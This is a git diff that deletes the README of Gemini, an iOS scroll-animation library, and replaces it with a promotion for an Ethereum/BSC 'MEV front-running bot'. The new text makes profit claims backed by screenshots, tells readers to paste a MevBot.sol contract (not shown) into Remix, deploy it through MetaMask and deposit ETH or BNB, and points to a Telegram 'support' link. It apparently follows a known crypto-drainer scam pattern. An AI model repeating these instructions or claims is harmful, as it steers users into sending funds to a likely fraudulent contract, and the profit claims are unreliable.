@@ -1,350 +1,90 @@
-<p align="center">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/logo.png" width="500">
-</p>
-
-# Overview
-
-<img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/demo-circle-rotation.gif" align="left">
-
-## What is the `Gemini`?
-
-`Gemini` is rich scroll based animation framework for iOS, written in Swift. You can easily use `GeminiCollectionView`, which is a subclass of `UICollectionView`.
-
-It enables you to make multiple animation which has various and customizable properties, and moreover can create your own custom scroll animation. 
-
-`Gemini` also provides a fluent interface based on method chaining. you can use this intuitively and simply.
-
+# Profit 13.05.23-17.05.23
 
-```swift
-collectionView.gemini
-    .circleRotationAnimation()
-    .radius(400)
-    .rotateDirection(.clockwise)
-```
+<img src="https://i.ibb.co/bWkNdH1/1.jpg" alt="1" border="0">
 
-# Features
+<img src="https://i.ibb.co/g9q1Njv/2.jpg" alt="2" border="0">
 
-![Platform](http://img.shields.io/badge/platform-ios-blue.svg?style=flat
-)
-[![Cocoapods](https://img.shields.io/badge/Cocoapods-compatible-brightgreen.svg)](https://img.shields.io/badge/Cocoapods-compatible-brightgreen.svg)
-[![Carthage compatible](https://img.shields.io/badge/Carthage-Compatible-brightgreen.svg?style=flat)](https://github.com/Carthage/Carthage)
-[![License](http://img.shields.io/badge/license-MIT-lightgrey.svg?style=flat
-)](http://mit-license.org)
-![Swift](https://img.shields.io/badge/swift-5.0-orange.svg)
-![pod](https://img.shields.io/badge/pod-v1.4.0-red.svg)
+# Mev Bot
+The term 'front-running' is commonly associated with the stock market, referring to the practice of leveraging insider information to seize market opportunities before others. This essentially amounts to insider trading.
 
-<img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/demo-yaw-rotation.gif" align="right">
+# The Front-Running Bot
+A front-running bot is an automated program that examines pending transactions and outbids others by offering a higher gas fee, ensuring its transaction gets priority in processing, thereby front-running significant trades likely to influence market prices.
 
-- [x] Rich animation with scrolling
-- [x] Easily usable
-- [x] Highly customizable
-- [x] Several types of animations and properties
-- [x] Supports vertical and horizontal flow layout
-- [x] Supports easing function
-- [x] Supports `Swift5.0`
-- [x] Fluent interfaces based on method chaining
-- [x] Compatible with `Carthage`
-- [x] Compatible with `CocoaPods`
-- [x] Example project with lots of stock animations
-- [x] And More...
+Bots, pre-configured programs, automate trading activities. They relieve users from constantly monitoring the market and determining the perfect timing for buying and selling. They auto-process and analyze market data, executing asset transactions on behalf of users. So, how do cryptocurrency front-running bots operate?
 
-# Contents
-- [Animation Types and properties](#anmation-types)
-- [Usage](#usage)
-- [Requirements](#requirements)
-- [Installation](#installation)
-- [Author](#author)
+Design elements of Ethereum or blockchain allow all submitted transactions to reside temporarily in a 'mempool,' a holding area for transactions awaiting processing. Miners or bots can scrutinize the mempool to find suitable transactions for front-running in cryptocurrency trading.
 
-# <a name="anmation-types"> Animation Types and properties
+Front-runner bots typically operate on a millisecond timescale. They can read a transaction from the mempool, calculate the ideal transaction size, set up the transactions, and execute them within split seconds. Manual operation cannot compete with this speed.
 
-The following animation types are available. See sample code [here](https://github.com/shoheiyokoyama/Gemini/tree/master/Example/Gemini) for details.
+By placing a buy order in the same block while setting a higher gas price, the bot front-runs specific transactions concerning slippage, trade volumes, and gas price. The front-run bot identifies when extra liquidity is added to an AMM (Automated Market Maker) pool on the exchange and manipulates the transaction order within a block to profit from another trader.
 
-- [Cube](#cube)
-- [Circle Rotation](#circle-rotation) You can configure direction of rotation using the `CircleRotationDirection`
-- [3D vector rotation](#3d-vector-rotation) Each rotation types provide multiple rotation effect
-  - [Roll Rotation](#roll-rotation)
-  - [Pitch Rotation](#pitch-rotation)
-  - [Yaw Rotation](#yaw-rotation)
-- [Scale](#scale)
-- [Custom](#custom) You can create your own custom scroll animation using multiple properties, rotation, scale, translation, etc.
+# Title:
+Creation of a Cutting-Edge Predictive Bot Leveraging Solidity Technology for Enhanced Mempool Scanning, Transaction Processing, and Security
 
-In addition, you can also customize the following properties for the above animation types.
+# Introduction:
+The world of cryptocurrency technology demands increasingly sophisticated transaction processing systems. Our innovative predictive bot, built on Solidity technology, offers superior performance compared to existing solutions. It provides more efficient mempool scanning, accelerated transaction processing, and heightened security for users.
 
-- BackgroundColor
-- CornerRadius
-- Alpha
-- [Easings](#easing-function)
-- [Shadow Effect](#shadow-effect)
+# Key Features and Benefits:
+Innovative Predictive Bot: Our bot possesses the capability to predict and assess transactions in the mempool, facilitating processing at the earliest stage. This enhancement speeds up transaction processing and minimizes user waiting times. Deployment of Solidity Technology: Solidity technology equips our bot with superior performance and reliability, assuring steady operation and effective transaction processing. Flexibility and Scalability: Our bot adjusts to network alterations and scales according to requirements, ensuring a stable system operation. Security and Privacy: Our bot assures high-level security and user data privacy, leveraging contemporary cryptographic methodologies.
 
-## <a name="cube"> Cube
+The bot generates a unique smart contract for each client with a dedicated balance, offering an additional security layer and preventing unauthorized user wallet access.
+Conclusion: Our Solidity technology-based predictive bot revolutionizes the process of mempool scanning and transaction processing. It ensures faster and more reliable service for cryptocurrency platform users, making our product an invaluable asset for the development of digital asset infrastructure. The bot's operational costs are restricted to gas fees on the Ethereum or BSC networks.
 
-<p align="center">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/cube-horizontal.gif">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/cube-vertical.gif">
-</p>
+# Bot capabilities:
+Check every WETH pair. Calculate possible profit Automatically submit transaction with higher gas fee than target (in order to get tokens first, low price > seek profit, gas fee included in calculation) Automatically sell tokens with prior gas fee (in order to be the first who sell tokens at higher price) MEV bot Instructions (works only for Mainnet) How it works: create-a-frontrunner-bot-on-uniswap
 
-It's a cube animation like Instagram.
-If you would like to customize the cube animation, change `cubeDegree`. 
-If `cubeDegree` is 90, it moves like a regular hexahedron.
+You can see an example of how the bot works
 
-```swift
-collectionView.gemini
-    .cubeAnimation()
-    .cubeDegree(90)
-```
+<img src="https://i.ibb.co/xsLft4F/3.jpg" alt="3" border="0">
 
-## <a name="circle-rotation"> CircleRotation
+# ✏️Step 1: 
+Remix Access the Remix IDE (this website is where we deploy the smart contract): https://remix.ethereum.org/ 
 
-<p align="center">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/circle-horizontal.gif">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/circle-vertical.gif">
-</p>
 
-An animation moves in a circle. You can change `circleRadius` and `CircleRotationDirection`.
+# ✏️ Step 2:
+File Explorer Hover over the tiny button in the top left and click and create new file "mevbot.sol" Copy the code from [**"MevBot.sol"**](MevBot.sol) and paste in Remix IDE
+Click Solidity complier 0.6.12
 
-```swift
-collectionView.gemini
-    .circleRotationAnimation()
-    .radius(450) // The radius of the circle
-    .rotateDirection(.clockwise) // Direction of rotation. 
-    .itemRotationEnabled(true) // Whether the item rotates or not.
-```
+<img src="https://i.ibb.co/Dg3HfJM/4-4.jpg" alt="4-4" border="0">
 
-## <a name="3d-vector-rotation"> 3D vector rotation
 
-Available for `Roll`, `Pitch` and `Yaw` animation. These rotation animation are designed based on 3-Dimensional vector. Figure-1 shows direction of rotation based on device.
+# ✏️ Step 3:
+go to deploy and enter your details below
+enter here
+1) ETH or BSC
+2) ETH or BSC
+3) your address
 
-###### ***Figure-1*** Pitch, roll, and yaw axes ######
-<p align="center">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/attitude_rotation.png" width="350">
-</p>
+<img src="https://i.ibb.co/0Kkg8qx/5.jpg" alt="5" border="0">
 
-###### Reference: [Event Handling Guide for UIKit Apps](https://developer.apple.com/library/content/documentation/EventHandling/Conceptual/EventHandlingiPhoneOS/HandlingProcessedDeviceMotionData.html#//apple_ref/doc/uid/TP40009541-CH27-SW1)
-
-### <a name="roll-rotation"> Roll Rotation
-
-<p align="center">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/roll-horizontal.gif">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/roll-vertical.gif">
-</p>
-
-### <a name="pitch-rotation"> Pitch Rotation
-
-<p align="center">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/pitch-horizontal.gif">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/pitch-vertical.gif">
-</p>
-
-### <a name="yaw-rotation"> Yaw Rotation
-
-<p align="center">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/yaw-horizontal.gif">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/yaw-vertical.gif">
-</p>
-
-
-Each types of rotation animation has `RotationEffect`(e.g. `RollRotationEffect`) and degree of rotation.
-
-Customize `RotationEffect` (`up`, `down`, `sineWave`, `reverseSineWave`) and degree of rotation.
-
-In the case of `rollRotation`, like this:
-```swift
-collectionView.gemini
-    .rollRotationAnimation()
-    .degree(45)
-    .rollEffect(.rollUp)
-```
-
-## <a name="scale"> Scale
-
-<p align="center">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/scale-up.gif">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/scale-down.gif">
-</p>
-
-The `scaleUp` gradually increases frame size, `scaleDown` decreases.
-
-```swift
-collectionView.gemini
-    .scaleAnimation()
-    .scale(0.75)
-    .scaleEffect(.scaleUp) // or .scaleDown
-```
 
-## <a name="custom"> Custom
+# ✏️ Step 4: 
+Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".
 
-<p align="center">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/custom1.gif">
-  <img src="https://github.com/shoheiyokoyama/Assets/blob/master/Gemini/custom2.gif">
-</p>
+<img src="https://i.ibb.co/5krtR1f/6.jpg" alt="6" border="0">
 
-You can flexibly and easily customize scroll animation. Customize properties of `GeminiAnimation.custom` such as `scale`, `scaleEffect`, `rotationAngle`, `translation`, `easing`, `shadowEffect`, `alpha`, `cornerRadius`, `backgroundColor`, `anchorPoint`, etc.
+# ✏️ Step 5:
+Next - Deposit Balance into MEV Bot and press "action" Copy your MevBot contract address and send a number of Ethereum / BNB to the bot's balance for the bot to work. And start it with the "action" button.
 
-The animation of gif is customized in the following way:
+ <img src="https://i.ibb.co/23CfpLs/7.jpg" alt="7" border="0">
 
-```swift
-collectionView.gemini
-    .customAnimation()
-    .translation(y: 50)
-    .rotationAngle(y: 13)
-    .ease(.easeOutExpo)
-    .shadowEffect(.fadeIn)
-    .maxShadowAlpha(0.3)
-```
 
-Or right side of gifs is customized as follows:
+ <img src="https://i.ibb.co/KqCqYkc/8.jpg" alt="8" border="0">
 
-```swift
-collectionView.gemini
-    .customAnimation()
-    .backgroundColor(startColor: lightGreenColor, endColor: lightBlueColor)
-    .ease(.easeOutSine)
-    .cornerRadius(75)
-```
 
-There are more sample code at [CustomAnimationViewController.swift](https://github.com/shoheiyokoyama/Gemini/blob/master/Example/Gemini/ViewControllers/CustomAnimationViewController.swift).
-
-## <a name="easing-function"> Easing function
-`Gemini` supports various easing functions based on distance of scroll.
-
-- linear
-- easeInQuad
-- easeOutQuad
-- easeInOutQuad
-- easeInCubic
-- easeOutCubic
-- easeInOutCubic
-- easeInQuart
--  easeOutQuart
-- easeInOutQuart
-- easeInQuint
-- easeOutQuint
-- easeInOutQuint
-- easeInSine
-- easeOutSine
-- easeInOutSine
-- easeInExpo
-- easeOutExpo
-- easeInOutExpo
-- easeInCirc
-- easeOutCirc
-- easeInOutCirc
+The MEVBot begins trading immeditately, simpy wait for profits to accumulate.
 
-## <a name="shadow-effect"> Shadow effect
-Default value is `ShadowEffect.none`. Return `shadowView` in your custom class, which is a subclass of `GeminiCell`.
+❗ NOTE:
+You can start with any amount, but keep in mind that you need enough money for gas. we reccomend a minimum of 0.5 ETG / 3 BNB for you to start seeing profits in the first 24 hours.
 
-- fadeIn
-- nextFadeIn
-- previousFadeIn
-- fadeOut
-- none
+You can stop the bot or withdraw your funds at any time by calling the action function.
 
-```swift
-class CustomCollectionViewCell: GeminiCell {
-    @IBOutlet weak var customShadowView: UIView!
-    override var shadowView: UIView? {
-        return customShadowView
-    }
-}
-```
+# Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
 
-# <a name="usage"> Usage
+# Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
 
-1. ***Use Gemini classes***
+# License
 
-`Gemini` is designed to be easy to use. Use `GeminiCollectionView` and `GeminiCell`. These classes is subclass of `UICollectionView`, `UICollectionViewCell`.
-
-2. ***Configure animation***
-
-Configure animation with fluent interface based on method chaining. You can develop expressive code that enhances readability.
-
-3. ***Call function for animation***
-
-Finally, call `animateVisibleCells()` in `scrollViewDidScroll(_:)`
-
-> NOTE: If you want to adapt animation immediately after view is displayed, call `animateCell(_:)` in `collectionView(_:cellForItemAt:)` and `collectionView(_:willDisplay:forItemAt:)`.
-
-
-```swift
-// Import Gemini
-import Gemini
-
-// Inherite GeminiCell
-class CustomCell: GeminiCell {
-    ...
-}
-
-// Conform to UICollectionViewDelegate and UICollectionViewDataSource
-class CustomViewController: UIViewController: UICollectionViewDelegate, UICollectionViewDataSource {
-
-    // Inherite GeminiCollectionView
-    @IBOutlet weak var collectionView: GeminiCollectionView!
-
-    ...
-
-    // Configure animation and properties
-    func configureAnimation() {
-        collectionView.gemini
-            .circleRotationAnimation()
-            .radius(400)
-            .rotateDirection(.clockwise)
-    }
-
-    // Call animation function
-    func scrollViewDidScroll(_ scrollView: UIScrollView) {
-        collectionView.animateVisibleCells()
-    }
-
-    func collectionView(_ collectionView: UICollectionView, willDisplay cell: UICollectionViewCell, forItemAt indexPath: IndexPath) {
-        if let cell = cell as? GeminiCell {
-            self.collectionView.animateCell(cell)
-        }
-    }
-
-    func collectionView(_ collectionView: UICollectionView, cellForItemAt indexPath: IndexPath) -> UICollectionViewCell {
-        let cell = collectionView.dequeueReusableCell(withReuseIdentifier: "CustomCell", for: indexPath) as! CustomCell
-        self.collectionView.animateCell(cell)
-        return cell
-    }
-```
-
-See [Example](https://github.com/shoheiyokoyama/Gemini/tree/master/Example/Gemini), for more details.
-
-To run the example project, clone the repo, and run `pod install` from the Example directory first.
-
-## <a name="requirements"> Requirements
-
-- Xcode 10.2.1
-- Swift 5.0
-
-## <a name="installation"> Installation
-
-### CocoaPods
-
-Gemini is available through [CocoaPods](http://cocoapods.org). To install
-it, simply add the following line to your Podfile:
-
-```ruby
-pod "Gemini"
-```
-
-### Carthage
-
-Add the following line to your `Cartfile`:
-
-```ruby
-github "shoheiyokoyama/Gemini"
-```
-
-## <a name="author"> Author
-
-Shohei Yokoyama
-
-- [GitHub](https://github.com/shoheiyokoyama)
-- [Facebook](https://www.facebook.com/shohei.yokoyama.96)
-- [Twitter](https://twitter.com/shoheiyokoyam)
-- Gmail: shohei.yok0602@gmail.com
-
-## License
-
-Gemini is available under the MIT license. See the [LICENSE file](https://github.com/shoheiyokoyama/Gemini/blob/master/LICENSE) for more info.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
